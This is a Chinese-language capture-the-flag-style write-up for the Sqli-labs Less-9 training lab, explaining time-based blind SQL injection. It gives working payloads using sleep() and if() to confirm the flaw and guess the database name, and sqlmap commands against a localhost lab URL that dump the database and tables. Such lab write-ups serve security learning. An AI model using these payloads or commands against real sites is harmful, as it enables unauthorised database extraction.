---
title: Sqli-labs Less-9 Writeup
date: 2026-11-16
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web]
---
## 题目描述
本关卡为 **时间盲注（Time-based Blind SQL Injection）**。
输入任意 `id`，页面永远只返回 `You are in...........`。没有数据回显，没有 SQL 报错，甚至连页面内容的差异（真/假状态）都没有。常规的 UNION 注入和布尔盲注在这里全部失效。

## 解题思路
1. **判断闭合方式**：测试 `?id=1'` 依然返回正常。既然没有回显和报错，我们需要通过**页面的响应时间**来判断闭合。
2. **测试时间延迟**：
   构造 `?id=1' and sleep(5) --+`。如果页面加载卡了 5 秒左右才显示，说明单引号 `'` 闭合正确，且 `sleep()` 函数被执行。
3. **利用 `if()` 函数进行逻辑判断**：
   `sleep()` 单独使用只能证明漏洞存在。我们需要结合 `if(条件, sleep(3), 1)`。如果条件成立，MySQL 会延迟 3 秒；如果不成立，瞬间返回。
4. **手工猜解数据**：
   - 猜解库名长度：`?id=1' and if(length(database())=8,sleep(3),1) --+`
   - 猜解首字母：`?id=1' and if(ascii(substr(database(),1,1))>100,sleep(3),1) --+`

> 知识点：时间盲注是 SQL 注入的“最后底牌”。当页面既没有数据回显，也没有真假状态区别时，只能通过页面加载的时间差来盲猜数据。实战中通常直接交给 SQLMap，手工盲注极度消耗时间。

## 通关 Payload (手工测试)

### 1. 测试延时（页面会卡 5 秒）
```sql
?id=1' and sleep(5) --+
```

### 2. 猜解数据库名长度（如果库名是 8 位，页面卡 3 秒；不是则秒回）

```sql
?id=1' and if(length(database())=8,sleep(3),1) --+
```

### 3. 猜解数据库名首字母（ASCII 大于 100 则卡 3 秒）

```sql
?id=1' and if(ascii(substr(database(),1,1))>100,sleep(3),1) --+
```

---

## 自动化工具通关 

手工时间盲注极其痛苦，强烈建议直接使用 SQLMap。
针对时间盲注，可以使用 --technique T 来指定技术，并通过 --time-sec 设置延迟时间。

```bash
# 爆当前库名
sqlmap -u "http://localhost/sqli-labs-master/Less-9/?id=1" --technique T --time-sec 3 --batch --current-db

# 爆 security 库下的所有表
sqlmap -u "http://localhost/sqli-labs-master/Less-9/?id=1" --technique T --time-sec 3 --batch -D security --tables
```

(注：本地环境测 sleep() 时，如果直接刷网页可能看不出延迟，建议把 sleep 后面的秒数设置大一点，比如 3 到 5 秒，肉眼更容易观察。)
